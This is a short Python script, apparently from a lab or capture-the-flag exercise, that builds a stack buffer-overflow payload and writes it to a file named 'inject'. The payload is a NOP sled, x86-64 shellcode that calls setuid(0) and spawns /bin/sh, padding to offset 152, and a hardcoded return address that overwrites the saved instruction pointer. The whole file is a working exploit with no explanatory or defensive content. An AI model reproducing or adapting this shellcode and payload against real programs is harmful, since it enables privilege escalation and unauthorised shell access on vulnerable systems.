MAGIC_N = 152 # 152 con ENV
if __name__ == '__main__':
    no_op = b'\x90' * 64
    shell_code = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
    padding = b'\x41' * ( MAGIC_N - len(no_op) - len(shell_code) )
    rip_ = b'\x30\xef\xff\xff\xff\x7f' # 0x7fffffffef30
    inject = no_op + shell_code + padding + rip_

    with open("inject", "wb") as f:
        f.write(inject)
